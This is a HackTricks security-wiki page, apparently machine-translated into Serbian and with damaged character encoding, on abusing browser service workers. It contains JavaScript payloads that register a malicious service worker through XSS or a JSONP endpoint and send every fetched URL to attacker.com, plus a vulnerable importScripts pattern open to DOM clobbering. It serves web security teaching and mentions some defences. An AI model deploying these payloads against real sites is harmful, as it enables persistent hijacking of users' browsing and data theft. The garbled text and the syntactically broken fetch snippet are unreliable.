# Abusing Service Workers



{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**Servisni radnik** je skripta koju va코 pregleda캜 pokre캖e u pozadini, odvojeno od bilo koje web stranice, omogu캖avaju캖i funkcije koje ne zahtevaju web stranicu ili interakciju korisnika, 캜ime se pobolj코avaju **offline i pozadinske obrade**. Detaljne informacije o servisnim radnicima mo쬰te prona캖i [ovde](https://developers.google.com/web/fundamentals/primers/service-workers). Iskori코캖avanjem servisnih radnika unutar ranjivog web domena, napada캜i mogu preuzeti kontrolu nad interakcijama rtve sa svim stranicama unutar tog domena.


### Checking for Existing Service Workers

Postoje캖i servisni radnici mogu se proveriti u sekciji **Servisni radnici** na **Aplikacija** tabu u **Alatima za programere**. Druga metoda je poseta [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) za detaljniji pregled.

### Push Notifications

**Dozvole za push obave코tenja** direktno uti캜u na sposobnost **servisnog radnika** da komunicira sa serverom bez direktne interakcije korisnika. Ako su dozvole odbijene, to ograni캜ava potencijal servisnog radnika da predstavlja kontinuiranu pretnju. S druge strane, davanje dozvola pove캖ava bezbednosne rizike omogu캖avanjem prijema i izvr코avanja potencijalnih eksploatacija.

## Attack Creating a Service Worker

Da biste iskoristili ovu ranjivost, potrebno je da prona캠ete:

* Na캜in da **otpremite proizvoljne JS** datoteke na server i **XSS za u캜itavanje servisnog radnika** otpremljene JS datoteke
* **Ranjivu JSONP zahtev** gde mo쬰te **manipulisati izlazom (sa proizvoljnim JS kodom)** i **XSS** da **u캜itate JSONP sa payload-om** koji 캖e **u캜itati zlonamernog servisnog radnika**.

U slede캖em primeru 캖u predstaviti kod za **registraciju novog servisnog radnika** koji 캖e slu코ati `fetch` doga캠aj i **slati napada캜evom serveru svaku preuzetu URL adresu** (ovo je kod koji biste trebali **otpremiti** na **server** ili u캜itati putem **ranjivog JSONP** odgovora):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
I ovo je kod koji 캖e **registrovati radnika** (kod koji biste trebali mo캖i da izvr코ite zloupotrebom **XSS**). U ovom slu캜aju, **GET** zahtev 캖e biti poslat na server **napada캜a** **obave코tavaju캖i** da li je **registracija** servisnog radnika bila uspe코na ili ne:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
U slu캜aju zloupotrebe ranjivog JSONP krajnjeg ta캜ke, trebali biste staviti vrednost unutar `var sw`. Na primer:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Postoji **C2** posve캖en **iskori코캖avanju Service Workers** pod nazivom [**Shadow Workers**](https://shadow-workers.github.io) koji 캖e biti veoma koristan za zloupotrebu ovih ranjivosti.

**Direktiva ke코iranja od 24 sata** ograni캜ava 쬴vot malignog ili kompromitovanog **service worker-a (SW)** na najvi코e 24 sata nakon ispravke XSS ranjivosti, pod pretpostavkom online statusa klijenta. Da bi se smanjila ranjivost, operateri sajtova mogu smanjiti Time-To-Live (TTL) SW skripte. Tako캠e, programerima se savetuje da kreiraju [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) za brzu deaktivaciju.

## Zloupotreba `importScripts` u SW putem DOM Clobbering-a

Funkcija **`importScripts`** pozvana iz Service Worker-a mo쬰 **importovati skriptu iz druge domene**. Ako se ova funkcija pozove koriste캖i **parametar koji bi napada캜 mogao** da izmeni, on bi mogao da **importuje JS skriptu iz svoje domene** i dobije XSS.

**Ovo 캜ak zaobilazi CSP za코tite.**

**Primer ranjivog koda:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Sa DOM Clobbering

Za vi코e informacija o tome 코ta je DOM Clobbering pogledajte:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Ako je URL/domen koji SW koristi za pozivanje **`importScripts`** **unutar HTML elementa**, **mogu캖e je modifikovati ga putem DOM Clobbering** da SW **u캜ita skriptu sa va코eg domena**.

Za primer ovog, pogledajte referentnu vezu.

## Reference

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
